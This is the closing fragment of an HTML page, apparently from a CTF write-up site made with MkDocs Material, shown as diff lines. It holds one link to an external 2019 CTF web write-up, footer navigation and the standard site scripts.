+<p><a href="https://mochazz.github.io/2019/05/03/2019星CTF之Web部分题解/#mywebsql">https://mochazz.github.io/2019/05/03/2019%E6%98%9FCTF%E4%B9%8BWeb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/#mywebsql</a></p>
+                
+              
+              
+                
+
+
+              
+            </article>
+          </div>
+        </div>
+      </main>
+      
+        
+<footer class="md-footer">
+  
+    <div class="md-footer-nav">
+      <nav class="md-footer-nav__inner md-grid" aria-label="Footer">
+        
+          <a href="../DASCTF/" title="DASCTF2020" class="md-footer-nav__link md-footer-nav__link--prev" rel="prev">
+            <div class="md-footer-nav__button md-icon">
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg>
+            </div>
+            <div class="md-footer-nav__title">
+              <div class="md-ellipsis">
+                <span class="md-footer-nav__direction">
+                  上一页
+                </span>
+                DASCTF2020
+              </div>
+            </div>
+          </a>
+        
+        
+      </nav>
+    </div>
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-footer-copyright">
+        
+        Made with
+        <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+          Material for MkDocs
+        </a>
+      </div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    
+      <script src="../../assets/javascripts/vendor.d710d30a.min.js"></script>
+      <script src="../../assets/javascripts/bundle.5f27aba8.min.js"></script><script id="__lang" type="application/json">{"clipboard.copy": "\u590d\u5236", "clipboard.copied": "\u5df2\u590d\u5236", "search.config.lang": "ja", "search.config.pipeline": "trimmer, stopWordFilter", "search.config.separator": "[\\uff0c\\u3002]+", "search.result.placeholder": "\u952e\u5165\u4ee5\u5f00\u59cb\u641c\u7d22", "search.result.none": "\u6ca1\u6709\u627e\u5230\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.one": "\u627e\u5230 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.other": "# \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c"}</script>
+      
+      <script>
+        app = initialize({
+          base: "../..",
+          features: ["tabs"],
+          search: Object.assign({
+            worker: "../../assets/javascripts/worker/search.27c6a5e6.min.js"
+          }, typeof search !== "undefined" && search)
+        })
+      </script>
+      
+    
+  </body>
+</html>
